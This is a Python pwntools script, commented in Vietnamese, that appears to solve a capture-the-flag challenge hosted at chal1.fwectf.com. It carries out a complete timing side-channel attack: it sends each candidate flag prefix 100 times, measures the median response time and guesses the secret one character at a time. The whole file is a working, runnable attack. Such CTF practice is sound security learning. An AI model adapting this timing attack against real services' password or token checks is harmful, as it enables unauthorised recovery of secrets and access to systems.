import time
from pwn import *
import string
import random
import statistics # Sử dụng thư viện statistics để tính median

# Cài đặt kết nối
HOST = "chal1.fwectf.com"
PORT = 8015

# Tập ký tự có thể có trong flag
CHARSET = "_0123456789abcdefghijklmnopqrstuvwxyz"
FLAG_LEN = 35

# Giảm số lần thử vì median ổn định hơn
# Bạn có thể tăng lên 5 nếu mạng yếu
SAMPLES_PER_CHAR = 3

def get_response_time(io, probe):
    """Hàm thực hiện 1 lần test trên một kết nối đang mở"""
    try:
        start_time = time.time()
        for i in range(100):
            io.recvuntil(b'> ')
            io.sendline(probe.encode())
        
        # Đợi phản hồi cuối cùng
        io.recvline() 
        end_time = time.time()
        return end_time - start_time
    except (EOFError, ConnectionResetError) as e:
        log.warning(f"Connection lost during test: {e}. Returning infinity.")
        return float('inf') # Trả về một giá trị rất lớn để báo hiệu lỗi

def solve():
    known_flag = "fwectf{"
    p = log.progress("Flag")
    p.status(known_flag)

    # OPTIMIZATION 1: Tạo kết nối một lần duy nhất ở ngoài vòng lặp
    io = remote(HOST, PORT, level='error')

    while len(known_flag) < FLAG_LEN:
        timings = {}

        shuffled_charset = list(CHARSET)
        random.shuffle(shuffled_charset)
        
        for char_to_guess in shuffled_charset:
            probe = (known_flag + char_to_guess).ljust(FLAG_LEN, '_')
            char_times = []

            for i in range(SAMPLES_PER_CHAR):
                # Nếu kết nối chết, kết nối lại
                if io.closed:
                    log.info("Reconnecting to the server...")
                    try:
                        io = remote(HOST, PORT, level='error')
                    except:
                        log.error("Failed to reconnect.")
                        char_times.append(float('inf'))
                        continue
                
                duration = get_response_time(io, probe)
                char_times.append(duration)

            # OPTIMIZATION 2: Sử dụng median thay cho min để ổn định hơn
            if char_times:
                median_time = statistics.median(char_times)
                timings[char_to_guess] = median_time
            else:
                timings[char_to_guess] = float('inf')

        if not timings:
            log.error("Failed to get any timings. Exiting.")
            break

        # Sắp xếp các kết quả để dễ dàng debug
        sorted_timings = sorted(timings.items(), key=lambda item: item[1])
        log.info(f"Timings for position {len(known_flag)}: {sorted_timings[:5]}") # In ra 5 kết quả tốt nhất

        # Ký tự tốt nhất là ký tự có thời gian median nhỏ nhất
        best_char = sorted_timings[0][0]
        
        # Kiểm tra sanity check: Thời gian của ký tự tốt nhất có thực sự nhỏ hơn đáng kể không?
        if len(sorted_timings) > 1:
            best_time = sorted_timings[0][1]
            second_best_time = sorted_timings[1][1]
            if second_best_time - best_time < 0.00015: # Chênh lệch lý thuyết là 0.0002s
                 log.warning(f"Time difference between '{best_char}' ({best_time:.4f}) and '{sorted_timings[1][0]}' ({second_best_time:.4f}) is very small. Result might be unstable.")

        known_flag += best_char
        p.status(known_flag)

    p.success(known_flag)
    io.close()

if __name__ == "__main__":
    solve()